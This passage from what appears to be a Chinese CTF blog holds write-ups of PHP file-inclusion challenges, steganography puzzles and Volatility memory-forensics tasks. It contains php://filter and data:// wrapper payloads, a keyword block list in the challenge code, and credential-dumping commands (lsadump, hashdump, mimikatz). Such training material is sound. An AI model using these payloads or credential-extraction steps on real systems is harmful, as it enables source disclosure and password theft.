class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>代码解析</p>
<p>如果<code>$file</code>包含”..&#x2F;“、”tp”、”input”或”data”（不区分大小写），则脚本会输出”Oh no!”并终止执行。</p>
<p>禁用了一部分伪协议的关键词，那么就用php:&#x2F;&#x2F;filter伪协议</p>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p><img src="/img/1721784913662-8.png" alt="img"></p>
<p>base解密</p>
<p>flag{3dbc981c-5d2a-4f52-895b-86ae37448724}</p>
<h3 id="GDOUCTF-2023-泄露的伪装"><a href="#GDOUCTF-2023-泄露的伪装" class="headerlink" title="[GDOUCTF 2023]泄露的伪装"></a>[GDOUCTF 2023]泄露的伪装</h3><p>考点：<strong>目录扫描，data伪协议使用</strong></p>
<p><img src="/img/1721784913662-9.png" alt="img"></p>
<p>你看不见我但是你又能看见我，应该是被隐藏了，用dir扫一下目录</p>
<p><img src="/img/1721784913662-10.png" alt="img"></p>
<p>发现&#x2F;test.txt和&#x2F;<a target="_blank" rel="noopener" href="http://www.rar/">www.rar</a></p>
<p>先进入&#x2F;test.txt</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cxk</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$cxk</span>)==<span class="string">&quot;ctrl&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;娲楁礂鐫″惂&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nononoononoonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>下载rar发现</p>
<p><img src="/img/1721784913662-11.png" alt="img"></p>
<p>进入&#x2F;orzorz.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>]))&#123; </span><br><span class="line">    <span class="variable">$cxk</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$cxk</span>)==<span class="string">&quot;ctrl&quot;</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;洗洗睡吧&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nononoononoonono&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span>nononoononoonono</span><br></pre></td></tr></table></figure>

<p>和test.txt相似</p>
<p>代码分析：检查是否存在名为 ‘cxk’ 的 GET 参数，赋值给$cxk</p>
<p>使用 file_get_contents($cxk) 函数读取 $cxk 变量中指定的 URL 或文件的内容</p>
<p>如果读取的内容等于字符串 “ctrl”，则输出变量 $flag 的值</p>
<p>file_get_content()函数配合php伪协议来获取flag</p>
<p>这里采用data协议，构造payload为</p>
<p>?cxk&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,ctrl</p>
<p>?cxk&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,Y3RybA&#x3D;&#x3D;</p>
<p><img src="/img/1721784913662-12.png" alt="img"></p>
<p>NSSCTF{a1475d2b-f68b-4eb0-aa97-3d998ac90e1a}</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-隐写一" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2024/07/23/%E9%9A%90%E5%86%99%E4%B8%80/" class="article-date">
      <time datetime="2024-07-23T01:51:15.000Z" itemprop="datePublished">2024-07-23</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2024/07/23/%E9%9A%90%E5%86%99%E4%B8%80/">隐写一</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <span id="more"></span>

<h2 id="jpg类隐写"><a href="#jpg类隐写" class="headerlink" title="jpg类隐写"></a>jpg类隐写</h2><h3 id="jphide隐写"><a href="#jphide隐写" class="headerlink" title="jphide隐写"></a>jphide隐写</h3><p>010里发现假的flag</p>
<p><img src="/img/1721699493768-127.png" alt="img"></p>
<p>5a+G56CBMTIz</p>
<p><img src="/img/1721699493768-128.png" alt="img"></p>
<p>密码123，有密码的jpg隐写，steghide,JPHS.</p>
<p>用stegdetect检查一下，发现是jphide隐写</p>
<p><img src="/img/1721699493768-129.png" alt="img"></p>
<p>JPHS</p>
<p><img src="/img/1721699493768-130.png" alt="img"></p>
<p>FSCTF{huang_duduanwangu}</p>
<h3 id="outguss隐写"><a href="#outguss隐写" class="headerlink" title="outguss隐写"></a>outguss隐写</h3><p><img src="/img/1721699493768-131.jpeg" alt="img"></p>
<p>查看属性：<strong>公正民主公正文明公正和谐</strong></p>
<p>社会主义核心价值观解密</p>
<p>密码为abc</p>
<p>采用outguess解密</p>
<p>outguess安装                                                              <a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_58199719/article/details/123692511?spm=1001.2014.3001.5501">https://blog.csdn.net/m0_58199719/article/details/123692511?spm=1001.2014.3001.5501</a></p>
<p><img src="/img/1721699493768-132.png" alt="img"></p>
<p>outguess使用</p>
<p>注意：<strong>outguess -k ‘密码’ -r 文件名 flag.txt</strong></p>
<p>ACTF{gue33_Gu3Ss!2020}</p>
<h3 id="F5-steganography隐写"><a href="#F5-steganography隐写" class="headerlink" title="F5-steganography隐写"></a>F5-steganography隐写</h3><p>刷新过的图片</p>
<p><img src="/img/1721699493768-133.jpeg" alt="img"></p>
<p>010里面没有有效信息，binwalk无结果，这题涉及F5-steganography隐写</p>
<p>工具安装参考博客   <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30627381/article/details/99264894">https://blog.csdn.net/weixin_30627381/article/details/99264894</a></p>
<p><img src="/img/1721699493768-134.png" alt="img"></p>
<p>进入F5-steganography-master文件夹，在空白处 ctrl+shift+鼠标右键-&gt;在此处打开命令窗口</p>
<p>在cmd中输入命令：</p>
<p>java Extract 文件的绝对路径 -p 密码</p>
<p><strong>注意：将图片放入F5-steganography-master目录中，会生成一个output.txt</strong></p>
<p><img src="/img/1721699493768-135.png" alt="img"></p>
<p>开头为PK,将txt改为zip即可出现flag</p>
<p>flag{96efd0a2037d06f34199e921079778ee}</p>
<h3 id="steghide隐写"><a href="#steghide隐写" class="headerlink" title="steghide隐写"></a>steghide隐写</h3><p>根据题目提示原神七七在哪里</p>
<p><img src="/img/1721699493768-136.png" alt="img"></p>
<p>密码为liyue</p>
<p>kali里用steghide里查看</p>
<p>命令是steghide extract -sf 文件名 -p 密码</p>
<p><img src="/img/1721699493768-137.png" alt="img"></p>
<p><img src="/img/1721699493768-138.png" alt="img"></p>
<p>发现零宽字符隐写</p>
<p><img src="/img/1721699493768-139.png" alt="img"></p>
<p>这是一个错误的flag，但是可能是字母的大小不一样，编写脚本，得出所有大小写的可能性，并生成dic.txt.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_character_combinations</span>(<span class="params">word</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;获取单词中每个字符的大小写组合可能性&quot;&quot;&quot;</span></span><br><span class="line">    character_combinations = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> word:</span><br><span class="line">        combinations = <span class="built_in">list</span>(<span class="built_in">set</span>([<span class="string">&quot;&quot;</span>.join(comb) <span class="keyword">for</span> comb <span class="keyword">in</span> itertools.product(*<span class="built_in">zip</span>(char.lower(), char.upper()))]))</span><br><span class="line">        character_combinations[char] = combinations</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> character_combinations</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_variants</span>(<span class="params">word, character_combinations</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成变形字符串&quot;&quot;&quot;</span></span><br><span class="line">    variants = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> combination <span class="keyword">in</span> itertools.product(*[character_combinations[char] <span class="keyword">for</span> char <span class="keyword">in</span> word]):</span><br><span class="line">        variant = <span class="string">&quot;&quot;</span>.join(combination)</span><br><span class="line">        <span class="keyword">if</span> variant != word:</span><br><span class="line">            variants.add(variant)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> variants</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_to_file</span>(<span class="params">variants, filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将变形字符串保存到文件中&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> variant <span class="keyword">in</span> variants:</span><br><span class="line">            file.write(<span class="string">f&quot;flag&#123;&#123;<span class="subst">&#123;variant&#125;</span>&#125;&#125;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 单词 JPeG_Is_IntErEsting</span></span><br><span class="line">word = <span class="string">&quot;JPeG_Is_IntErEsting&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取字符大小写组合可能性</span></span><br><span class="line">character_combinations = get_character_combinations(word)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成变形字符串</span></span><br><span class="line">variants = generate_variants(word, character_combinations)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存到文件</span></span><br><span class="line">save_to_file(variants, <span class="string">&quot;dic.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;保存成功！&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>进行字典爆破</p>
<p><img src="/img/1721699493768-140.png" alt="img"></p>
<p>得到密码flag{JPeG_Is_IntErEsting}</p>
<p>kali里zsteg发现base，zsteg主要查看lsb,,这里的base不全，继续返回stegsolve里看msb</p>
<p><img src="/img/1721699493768-141.png" alt="img"></p>
<p><img src="/img/1721699493769-142.png" alt="img"></p>
<p>将HYNUCTF{This_is_a_fake_flag}删掉</p>
<p><img src="/img/1721699493769-143.png" alt="img"></p>
<p>得到HYNUCTF{RgB_or_Lsb_may_Y0u_knnoww?}</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-内存取证" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2024/07/22/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" class="article-date">
      <time datetime="2024-07-22T07:54:20.000Z" itemprop="datePublished">2024-07-22</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2024/07/22/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">内存取证</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <span id="more"></span>

<h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><h3 id="volatility基础命令"><a href="#volatility基础命令" class="headerlink" title="volatility基础命令"></a>volatility基础命令</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">imageinfo：显示目标镜像的摘要信息，这常常是第一步，获取内存的操作系统类型及版本，之后可以在 –profile 中带上对应的操作系统，后续操作都要带上这一参数</span><br><span class="line"></span><br><span class="line">pslist：该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以</span><br><span class="line"></span><br><span class="line">pstree：以树的形式查看进程列表，和pslist一样，也无法检测隐藏或解链的进程</span><br><span class="line"></span><br><span class="line">psscan：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程</span><br><span class="line"></span><br><span class="line">cmdscan：可用于查看终端记录</span><br><span class="line"></span><br><span class="line">notepad：查看当前展示的 notepad 文本（–profile=winxp啥的低版本可以，win7的不行，可以尝试使用editbox）</span><br><span class="line"></span><br><span class="line">filescan：扫描所有的文件列表</span><br><span class="line"></span><br><span class="line">linux配合 grep 命令进行相关字符定向扫描，如：grep flag、grep -E ‘png|jpg|gif|<span class="built_in">zip</span>|rar|7z|pdf|txt|doc’</span><br><span class="line"></span><br><span class="line">dumpfiles：导出某一文件(指定虚拟地址)</span><br><span class="line"></span><br><span class="line">需要指定偏移量 -Q 和输出目录 -D</span><br><span class="line"></span><br><span class="line">mendump：提取出指定进程，常用foremost 来分离里面的文件</span><br><span class="line"></span><br><span class="line">需要指定进程-p [pid] 和输出目录 -D</span><br><span class="line"></span><br><span class="line">editbox：显示有关编辑控件（曾经编辑过的内容）的信息</span><br><span class="line"></span><br><span class="line">screenshot：保存基于GDI窗口的伪截屏</span><br><span class="line"></span><br><span class="line">clipboard：查看剪贴板信息</span><br><span class="line"></span><br><span class="line">iehistory：检索IE浏览器历史记录</span><br><span class="line"></span><br><span class="line">systeminfo：显示关于计算机及其操作系统的详细配置信息（插件）</span><br><span class="line"></span><br><span class="line">hashdump：查看当前操作系统中的 password <span class="built_in">hash</span>，例如 Windows 的 SAM 文件内容(mimikatz插件可以获取系统明文密码)</span><br><span class="line"></span><br><span class="line">mftparser：恢复被删除的文件</span><br><span class="line"></span><br><span class="line">svcscan：扫描 Windows 的服务</span><br><span class="line"></span><br><span class="line">connscan：查看网络连接</span><br><span class="line"></span><br><span class="line">envars：查看环境变量</span><br><span class="line"></span><br><span class="line">dlllist: 列出某一进程加载的所有dll文件</span><br><span class="line"></span><br><span class="line">hivelist: 列出所有的注册表项及其虚拟地址和物理地址</span><br><span class="line"></span><br><span class="line">timeliner: 将所有操作系统事件以时间线的方式展开</span><br></pre></td></tr></table></figure>

<p>自己总结</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">一：总结一下上面题目所用到的命令</span><br><span class="line">查看镜像</span><br><span class="line">vol.py -f Target.vmem imageinfo </span><br><span class="line">提取本地存储的凭证信息</span><br><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 lsadump</span><br><span class="line">扫描含CTF的文件</span><br><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 filescan | grep CTF</span><br><span class="line">扫描多个文件</span><br><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 filescan | grep -E <span class="string">&quot;jpg|png|zip|rar|gif&quot;</span></span><br><span class="line">提取文件</span><br><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 dumpfiles -Q <span class="number">0x000000007d8c7d10</span> -D <span class="number">1</span></span><br><span class="line">查看进程</span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pslist</span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pstree</span><br><span class="line">扫描终端</span><br><span class="line">vol.py -f file.raw --profile=WinXPSP2x86 cmdscan</span><br><span class="line">查看浏览记录</span><br><span class="line">vol.py -f file.raw --profile=WinXPSP2x86 iehistory</span><br><span class="line">扫描其IP地址</span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 netscan | grep <span class="string">&quot;LunarMS.exe&quot;</span></span><br><span class="line">查看剪切板信息</span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 clipboard</span><br></pre></td></tr></table></figure>

<h3 id="陇剑杯-2021-内存分析（问1）"><a href="#陇剑杯-2021-内存分析（问1）" class="headerlink" title="[陇剑杯 2021]内存分析（问1）"></a>[陇剑杯 2021]内存分析（问1）</h3><p>查看镜像</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f Target.vmem imageinfo </span><br></pre></td></tr></table></figure>

<p><img src="/img/1721634933786-28.png" alt="img"></p>
<p>1：没有安装pycryptodome，kali里自带python3的环境，有python2的环境却没有pip2</p>
<p>这里得在python2的环境下使用pip2来安装pycryptodome</p>
<p>一：下载get-pip.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/<span class="number">2.7</span>/get-pip.py </span><br></pre></td></tr></table></figure>

<p>二：python执行get-pip.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python2 get-pip.py</span><br></pre></td></tr></table></figure>

<p>三：查看pip2的版本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 -V</span><br></pre></td></tr></table></figure>

<p><img src="/img/1721634933787-29.png" alt="img"></p>
<p>四：安装pycryptodome</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 install pycryptodome</span><br></pre></td></tr></table></figure>

<p><img src="/img/1721634933787-30.png" alt="img"></p>
<p><img src="/img/1721634933787-31.png" alt="img"></p>
<p>2：可以找到Win7SP1x64，通过lsadump插件将被调用以提取本地存储的凭证信息</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 lsadump</span><br></pre></td></tr></table></figure>

<p><img src="/img/1721634933787-32.png" alt="img"></p>
<p>方法二：使用mimikatz插件来解</p>
<p>1:下载mimikatz.py,将其移至volatility的plugins,注意这里不能直接复制粘贴进去，得使用命令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv mimikatz.py /home/kali/Desktop/volatility/plugins/</span><br></pre></td></tr></table></figure>

<p>2：安装construct</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install construct</span><br></pre></td></tr></table></figure>

<p>嘶，我没装上，嘿嘿，不过用处和lsadump插件差不多</p>
<h3 id="陇剑杯-2021-内存分析（问2）"><a href="#陇剑杯-2021-内存分析（问2）" class="headerlink" title="[陇剑杯 2021]内存分析（问2）"></a>[陇剑杯 2021]内存分析（问2）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">网管小王制作了一个虚拟机文件，让您来分析后作答：</span><br><span class="line">虚拟机中有一个某品牌手机的备份文件，文件里的图片里的字符串为_____________。（解题过程中需要用到上一题答案中flag&#123;&#125;内的内容进行处理。本题的格式也是flag&#123;xxx&#125;，含有空格，提交时不要去掉）。</span><br></pre></td></tr></table></figure>

<p>试着搜索CTF的文件名，可以发现HUAWEI P40</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 filescan | grep CTF</span><br></pre></td></tr></table></figure>

<p><img src="/img/1721634933787-33.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 filescan | grep HUAWEI</span><br></pre></td></tr></table></figure>

<p><img src="/img/1721634933787-34.png" alt="img"></p>
<p>导出第一个</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 dumpfiles -Q <span class="number">0x000000007d8c7d10</span> -D <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/1721634933787-35.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip file.<span class="literal">None</span><span class="number">.0</span>xfffffa80037e0af0.dat</span><br></pre></td></tr></table></figure>

<p><img src="/img/1721634933787-36.png" alt="img"></p>
<p>解压之后我们可以发现多了一个文件夹，并发现一个images0.tar.enc文件，此文件为华为加密文件，在网上下载相应的解密脚本即可</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/RealityNet/kobackupdec">https://github.com/RealityNet/kobackupdec</a></p>
<p>这里需要用到的密码为第一题所需的密码，文件夹为刚才解压出来的文件夹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 kobackupdec.py -vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX <span class="string">&quot;/home/kali/Desktop/HUAWEI P40_2021-aa-bb xx.yy.zz&quot;</span> /home/kali/Desktop/<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/1721634933787-37.png" alt="img"></p>
<p>在所生成的文件2里找到相应的压缩包，得到flag</p>
<p><img src="/img/1721634933787-38.png" alt="img"></p>
<h3 id="羊城杯-2021-Baby-Forenisc"><a href="#羊城杯-2021-Baby-Forenisc" class="headerlink" title="[羊城杯 2021]Baby_Forenisc"></a>[羊城杯 2021]Baby_Forenisc</h3><p>查看镜像的系统版本</p>
<p><img src="/img/1721634933787-39.png" alt="img"></p>
<p>查看进程</p>
<p><img src="/img/1721634933787-40.png" alt="img"></p>
<p>查看cmd命令</p>
<p><img src="/img/1721634933787-41.png" alt="img"></p>
<p>使用git命令上传了一些文件，既然上传了一些文件，我们使用grep来特定找出相应的文件</p>
<p><img src="/img/1721634933787-42.png" alt="img"></p>
<p>实在不放心可以使用file命令来查看其类型</p>
<p><img src="/img/1721634933788-43.png" alt="img"></p>
<p>可以发现其为SSH私钥</p>
<p>使用dumpfiles将其ssh.txt导出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f BIODOG-7711E93C-<span class="number">20210908</span>-<span class="number">053022.</span>raw --profile=WinXPSP2x86 dumpfiles -Q <span class="number">0x00000000020bf6a0</span> -D <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/1721634933788-44.png" alt="img"></p>
<p>base64对其进行编码和解码来提取.dat的数据</p>
<p><img src="/img/1721634933788-45.png" alt="img"></p>
<p>这里发现qq邮箱</p>
<p><img src="/img/1721634933788-46.png" alt="img"></p>
<p>github上搜索其qq邮箱</p>
<p><img src="/img/1721634933788-47.png" alt="img"></p>
<p><img src="/img/1721634933788-48.png" alt="img"></p>
<p>下载其_APP_,010里找到</p>
<p><img src="/img/1721634933788-49.png" alt="img"></p>
<p>base64解码</p>
<p>SangFor{S0_3azy_2_crack_noob_player}</p>
<h3 id="鹏城杯-2022-简单取证"><a href="#鹏城杯-2022-简单取证" class="headerlink" title="[鹏城杯 2022]简单取证"></a>[鹏城杯 2022]简单取证</h3><p>查看镜像，找到WinXPSP2x86</p>
<p><img src="/img/1721634933788-50.png" alt="img"></p>
<p>发现一张secret.jpg,使用dump提取出来</p>
<p><img src="/img/1721634933788-51.png" alt="img"></p>
<p>又或者是直接查看其浏览记录vol.py -f file.raw –profile&#x3D;WinXPSP2x86 iehistory</p>
<p><img src="/img/1721634933788-52.png" alt="img"></p>
<p><img src="/img/1721634933788-53.png" alt="img"></p>
<p>找到jpg图片vol.py -f file.raw –profile&#x3D;WinXPSP2x86 filescan | grep secret.jpg</p>
<p><img src="/img/1721634933788-54.png" alt="img"></p>
<p>提取jpg图片vol.py -f file.raw –profile&#x3D;WinXPSP2x86 dumpfiles -Q 0x0000000002325028 -D 3</p>
<p><img src="/img/1721634933789-55.png" alt="img"></p>
<p><img src="/img/1721634933789-56.png" alt="img"></p>
<p>注意：这里导出的并不是jpg图片，而是其数据，可以发现是base64编码，对其进行base64解码，可以发现其是一个压缩包的逆序数据。</p>
<p>可以使用base64 -d file.None.0x81fc6610.dat | rev ,嘶，这个直接卡死，转半天没转出来</p>
<p><img src="/img/1721634933789-57.png" alt="img"></p>
<p>在厨师里进行解密，保存为zip,嘶，这里转化有点问题，找不到flag.txt</p>
<p><img src="/img/1721634933789-58.png" alt="img"></p>
<p>直接用脚本进行转化.这个可以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.jpg&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    r = f.read()</span><br><span class="line"></span><br><span class="line">lst = <span class="built_in">list</span>(base64.b64decode(r))</span><br><span class="line">lst.reverse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    